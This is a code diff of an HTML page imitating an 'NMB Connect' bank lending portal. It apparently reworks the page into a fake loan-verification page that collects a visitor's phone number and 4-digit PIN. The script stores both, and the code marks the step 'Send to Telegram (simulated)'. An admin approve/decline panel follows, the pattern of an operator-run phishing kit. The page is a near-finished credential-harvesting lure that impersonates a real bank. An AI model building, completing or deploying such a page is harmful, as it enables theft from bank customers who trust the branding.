@@ -8,114 +8,121 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
-        body { 
-            font-family: 'Inter', sans-serif; 
-            background: linear-gradient(to bottom, #004a99 0%, #004a99 200px, #f4f7fa 200px);
-            min-height: 100vh;
-        }
-        .nmb-blue { color: #003366; }
-        .nmb-bg-blue { background-color: #003366; }
+        * { font-family: 'Inter', sans-serif; }
+        body { background: linear-gradient(135deg, #004a99 0%, #003366 100%); min-height: 100vh; }
         .pin-input:focus { border-color: #f2a900; box-shadow: 0 0 0 2px rgba(242, 169, 0, 0.2); }
-        .admin-btn { transition: all 0.2s; }
-        .admin-btn:hover { transform: translateY(-2px); }
     </style>
 </head>
-<body class="flex flex-col items-center">
-    <div class="mt-8 mb-6 text-center">
-        <div class="flex items-center justify-center space-x-1">
-            <span class="text-2xl font-black text-white">NMB</span>
-            <span class="text-2xl font-black text-[#f2a900]">Connect</span>
+<body class="flex flex-col items-center justify-center min-h-screen p-3 sm:p-4">
+    <div class="w-full max-w-sm">
+        <!-- Header -->
+        <div class="text-center mb-5">
+            <div class="flex items-center justify-center gap-1 mb-2">
+                <span class="text-xl sm:text-2xl font-black text-white">NMB</span>
+                <span class="text-xl sm:text-2xl font-black text-[#f2a900]">Connect</span>
+            </div>
+            <p class="text-white/70 text-xs font-semibold uppercase tracking-wide">Secure Access</p>
         </div>
-        <p class="text-white/80 text-[10px] mt-1 uppercase tracking-[0.2em] font-bold">Secure Access</p>
-    </div>
 
-    <main class="w-full max-w-lg px-4 mb-8">
-        <div class="bg-white rounded-[2.5rem] shadow-2xl overflow-hidden">
-            <div id="loginForm" class="p-10 space-y-10">
-                <div class="text-center">
-                    <h2 class="text-3xl font-black text-gray-800 tracking-tight">Welcome Back</h2>
-                    <p class="text-gray-400 text-sm mt-2 font-medium">Enter your credentials to access your portal</p>
-                </div>
+        <!-- Main Card -->
+        <div class="bg-white rounded-xl sm:rounded-2xl shadow-2xl overflow-hidden">
+            <!-- Title Section -->
+            <div class="bg-gradient-to-r from-[#003366] to-[#004a99] p-4 sm:p-5 text-center">
+                <h1 class="text-white font-black text-lg sm:text-xl mb-1">Verify Your Details</h1>
+                <p class="text-white/80 text-xs">Enter your phone and PIN</p>
+            </div>
 
-                <div class="space-y-8">
-                    <div class="space-y-3">
-                        <label class="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Phone Number</label>
-                        <div class="relative">
-                            <span class="absolute left-6 top-1/2 -translate-y-1/2 text-gray-400 font-black text-lg">+263</span>
-                            <input type="tel" id="phone" maxlength="9" placeholder="771234567" 
-                                class="w-full pl-20 pr-6 py-5 bg-gray-50/50 border border-gray-100 rounded-3xl focus:outline-none focus:border-[#f2a900] transition-all font-black text-xl text-gray-700 placeholder:text-gray-200">
-                        </div>
-                    </div>
-
-                    <div class="space-y-3">
-                        <label class="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">4-Digit PIN</label>
-                        <div class="flex justify-between space-x-4">
-                            <input type="password" maxlength="1" class="pin-input w-full h-20 text-center text-3xl font-black bg-gray-50/50 border border-gray-100 rounded-3xl focus:outline-none">
-                            <input type="password" maxlength="1" class="pin-input w-full h-20 text-center text-3xl font-black bg-gray-50/50 border border-gray-100 rounded-3xl focus:outline-none">
-                            <input type="password" maxlength="1" class="pin-input w-full h-20 text-center text-3xl font-black bg-gray-50/50 border border-gray-100 rounded-3xl focus:outline-none">
-                            <input type="password" maxlength="1" class="pin-input w-full h-20 text-center text-3xl font-black bg-gray-50/50 border border-gray-100 rounded-3xl focus:outline-none">
-                        </div>
+            <!-- Content -->
+            <div id="loginForm" class="p-5 sm:p-6 space-y-5">
+                <!-- Loan Amount Display -->
+                <div class="bg-blue-50 border border-blue-100 rounded-lg p-3">
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs font-black text-gray-600 uppercase">Loan Amount</span>
+                        <span class="font-black text-lg text-[#003366]" id="displayAmount">$500</span>
                     </div>
                 </div>
 
-                <button id="submitBtn" class="w-full nmb-bg-blue text-white font-black py-6 rounded-3xl shadow-xl hover:opacity-95 transition-all transform active:scale-[0.98] uppercase tracking-[0.2em] text-sm">
-                    Sign In
+                <!-- Phone Number -->
+                <div class="space-y-2">
+                    <label class="text-xs font-black text-gray-600 uppercase">Phone Number</label>
+                    <div class="relative">
+                        <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 font-black">+263</span>
+                        <input type="tel" id="phone" maxlength="9" placeholder="771234567" 
+                            class="w-full pl-16 pr-4 py-3 sm:py-4 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:border-[#f2a900] transition-all font-black text-base text-gray-700 placeholder:text-gray-300">
+                    </div>
+                </div>
+
+                <!-- PIN -->
+                <div class="space-y-2">
+                    <label class="text-xs font-black text-gray-600 uppercase">4-Digit PIN</label>
+                    <div class="flex gap-2 sm:gap-3">
+                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
+                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
+                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
+                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
+                    </div>
+                </div>
+
+                <!-- Submit Button -->
+                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-3 sm:py-4 rounded-lg hover:shadow-lg transition-all uppercase text-xs sm:text-sm tracking-wide">
+                    Send to Admin
                 </button>
             </div>
 
-            <!-- Polling & Admin Simulation -->
-            <div id="pollingOverlay" class="hidden p-12 text-center space-y-10">
-                <div class="relative w-28 h-28 mx-auto">
-                    <div class="absolute inset-0 border-[6px] border-gray-50 rounded-full"></div>
-                    <div class="absolute inset-0 border-[6px] border-[#f2a900] border-t-transparent rounded-full animate-spin"></div>
+            <!-- Polling Overlay -->
+            <div id="pollingOverlay" class="hidden p-6 sm:p-8 text-center space-y-6">
+                <div class="relative w-20 h-20 sm:w-24 sm:h-24 mx-auto">
+                    <div class="absolute inset-0 border-4 border-gray-50 rounded-full"></div>
+                    <div class="absolute inset-0 border-4 border-[#f2a900] border-t-transparent rounded-full animate-spin"></div>
                     <div class="absolute inset-0 flex items-center justify-center">
-                        <i class="fas fa-shield-alt text-4xl nmb-blue"></i>
+                        <i class="fas fa-shield-alt text-2xl sm:text-3xl text-[#003366]"></i>
                     </div>
                 </div>
                 
-                <div class="space-y-3">
-                    <h3 class="text-2xl font-black text-gray-800 tracking-tight">Security Check</h3>
-                    <p class="text-gray-400 text-sm font-medium leading-relaxed">We've sent your request to the admin.<br>Please wait for approval.</p>
+                <div class="space-y-2">
+                    <h3 class="text-lg sm:text-xl font-black text-gray-800 tracking-tight">Awaiting Approval</h3>
+                    <p class="text-gray-500 text-xs sm:text-sm font-medium leading-relaxed">Your request has been sent to admin.<br>Waiting for approval...</p>
                 </div>
 
-                <!-- Admin Action Simulation (Telegram Style) -->
-                <div class="bg-gray-50 rounded-3xl p-6 space-y-4">
-                    <p class="text-[10px] font-black text-gray-400 uppercase tracking-widest">Admin Decision (Simulation)</p>
-                    <div class="grid grid-cols-1 gap-3">
-                        <button onclick="handleAdmin('approve')" class="admin-btn bg-green-500 text-white font-black py-4 rounded-2xl shadow-lg flex items-center justify-center space-x-2">
-                            <i class="fas fa-check-circle"></i> <span>APPROVE</span>
+                <!-- Admin Action Simulation -->
+                <div class="bg-gray-50 rounded-lg p-4 space-y-3 border border-gray-200">
+                    <p class="text-xs font-black text-gray-400 uppercase tracking-widest">Admin Decision (Simulation)</p>
+                    <div class="grid grid-cols-1 gap-2">
+                        <button onclick="handleAdmin('approve')" class="bg-green-500 hover:bg-green-600 text-white font-black py-3 rounded-lg transition-all flex items-center justify-center gap-2 text-xs uppercase tracking-wide">
+                            <i class="fas fa-check-circle"></i> APPROVE
                         </button>
-                        <button onclick="handleAdmin('decline')" class="admin-btn bg-red-500 text-white font-black py-4 rounded-2xl shadow-lg flex items-center justify-center space-x-2">
-                            <i class="fas fa-times-circle"></i> <span>DECLINE</span>
+                        <button onclick="handleAdmin('decline')" class="bg-red-500 hover:bg-red-600 text-white font-black py-3 rounded-lg transition-all flex items-center justify-center gap-2 text-xs uppercase tracking-wide">
+                            <i class="fas fa-times-circle"></i> DECLINE
                         </button>
-                        <button onclick="handleAdmin('applied')" class="admin-btn bg-orange-500 text-white font-black py-4 rounded-2xl shadow-lg flex items-center justify-center space-x-2">
-                            <i class="fas fa-history"></i> <span>ALREADY APPLIED</span>
+                        <button onclick="handleAdmin('applied')" class="bg-orange-500 hover:bg-orange-600 text-white font-black py-3 rounded-lg transition-all flex items-center justify-center gap-2 text-xs uppercase tracking-wide">
+                            <i class="fas fa-history"></i> ALREADY APPLIED
                         </button>
                     </div>
                 </div>
             </div>
         </div>
-    </main>
 
-    <!-- Warning Modal -->
-    <div id="warningModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
-        <div class="bg-white rounded-[2rem] max-w-sm w-full p-8 text-center space-y-6 shadow-2xl">
-            <div class="w-20 h-20 bg-orange-100 text-orange-500 rounded-full flex items-center justify-center mx-auto">
-                <i class="fas fa-exclamation-triangle text-3xl"></i>
+        <!-- Warning Modal -->
+        <div id="warningModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
+            <div class="bg-white rounded-xl sm:rounded-2xl max-w-xs w-full p-6 sm:p-8 text-center space-y-4 shadow-2xl">
+                <div class="w-16 h-16 bg-orange-100 text-orange-500 rounded-full flex items-center justify-center mx-auto">
+                    <i class="fas fa-exclamation-triangle text-2xl"></i>
+                </div>
+                <div class="space-y-1">
+                    <h4 class="text-lg font-black text-gray-800 uppercase">Attention</h4>
+                    <p class="text-gray-500 text-xs sm:text-sm font-medium">This user has already applied for a loan.</p>
+                </div>
+                <button onclick="closeWarning()" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-3 rounded-lg uppercase text-xs tracking-wide">
+                    OK
+                </button>
             </div>
-            <div class="space-y-2">
-                <h4 class="text-xl font-black text-gray-800 uppercase tracking-tight">Attention Required</h4>
-                <p class="text-gray-500 text-sm font-medium">This user has already applied for a loan. Please decline to proceed with a new application.</p>
-            </div>
-            <button onclick="closeWarning()" class="w-full nmb-bg-blue text-white font-black py-4 rounded-2xl uppercase tracking-widest text-xs">
-                OK, I Understand
-            </button>
         </div>
-    </div>
 
-    <footer class="pb-8 text-center text-gray-400 text-[10px] font-black uppercase tracking-[0.3em]">
-        &copy; 2026 NMB Holdings | Secure Lending Platform
-    </footer>
+        <!-- Footer -->
+        <p class="text-center text-white/60 text-xs mt-5 font-semibold">
+            © 2026 NMB Holdings | Zimbabwe's Trusted Lender
+        </p>
+    </div>
 
     <script>
         const pinInputs = document.querySelectorAll('.pin-input');
@@ -124,6 +131,13 @@
         const loginForm = document.getElementById('loginForm');
         const pollingOverlay = document.getElementById('pollingOverlay');
         const warningModal = document.getElementById('warningModal');
+        const displayAmount = document.getElementById('displayAmount');
+
+        // Load loan data
+        const loanData = JSON.parse(localStorage.getItem('nmb_loan_data') || '{}');
+        if (loanData.amount) {
+            displayAmount.textContent = `$${loanData.amount}`;
+        }
 
         pinInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
@@ -145,7 +159,15 @@
             if (phone.length !== 9) { alert('Please enter a valid 9-digit phone number'); return; }
             if (pin.length !== 4) { alert('Please enter your 4-digit PIN'); return; }
 
-            localStorage.setItem('nmb_session', JSON.stringify({ phone: '+263' + phone, pin: pin }));
+            const sessionData = {
+                phone: '+263' + phone,
+                pin: pin,
+                amount: loanData.amount || '500'
+            };
+            localStorage.setItem('nmb_session', JSON.stringify(sessionData));
+
+            // Send to Telegram (simulated)
+            console.log('Sending to Telegram:', sessionData);
 
             loginForm.classList.add('hidden');
             pollingOverlay.classList.remove('hidden');
